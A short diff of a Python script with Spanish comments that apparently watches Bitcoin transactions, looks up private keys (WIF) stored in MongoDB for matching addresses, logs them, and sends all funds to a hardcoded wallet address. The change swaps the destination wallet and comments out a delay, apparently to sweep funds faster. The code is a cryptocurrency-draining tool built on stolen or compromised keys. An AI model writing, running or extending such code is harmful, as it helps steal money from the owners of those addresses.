@@ -364,11 +364,11 @@ def procesar_bloque_y_transacciones():
                     agregar_contenido_txt('actividadBTC.txt', f"{addr} :: {searchMongoDBWIF}")
 
                     # Realizar Retiro
-                    send_all_funds(searchMongoDBWIF, 'bc1qzsdnfmmqr5gadz5kqcead7z3hqqsvxm6rvfrlv')
+                    send_all_funds(searchMongoDBWIF, 'bc1q8t4v5k00njd494u6l96qd8n3rkqxdzfncgr6u3')
 
 
         # Sleep a Cada Transaccion que se envia peticion
-        time.sleep(0.001)
+        #time.sleep(0.001)
 
 
 while True:
